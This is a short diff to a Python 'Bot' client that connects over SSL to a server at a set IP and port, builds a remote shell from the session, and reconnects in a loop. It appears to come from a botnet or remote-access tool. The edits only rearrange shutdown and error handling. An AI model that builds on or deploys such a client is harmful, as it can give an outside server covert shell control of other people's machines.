@@ -40,7 +40,6 @@ class Bot(object):
 
     def shutdown(self):
         try:
-            self.shell.stop()
             self.conn.shutdown(socket.SHUT_RDWR)
             self.conn.close()
         except:
@@ -52,10 +51,11 @@ class Bot(object):
         self.conn = ssl.wrap_socket(sock, ssl_version=ssl.PROTOCOL_SSLv23)
         s = session.Session(self.conn)
         services = s.connect(self.ip, self.port)
+
         if not services:
             self.ip, self.port, self.is_active = None, None, False
             self.display_text(
-                'Error: Server is unavailable, trying again in a bit')
+                'Server is unavailable, trying again in a bit')
         else:
             self.shell = shell.Shell(s, services['args'], self.home)
             self.is_active = True
@@ -71,6 +71,8 @@ class Bot(object):
         try:
             self.connect()
         except:
+            pass
+        finally:
             self.shutdown()
 
 
@@ -81,7 +83,7 @@ if __name__ == '__main__':
         chdir(home)
         bot = Bot(home)
         bot.contact_server(IP, PORT)
-        bot.shutdown()
+
         if bot.shell:
             if bot.shell.disconnected:
                 break
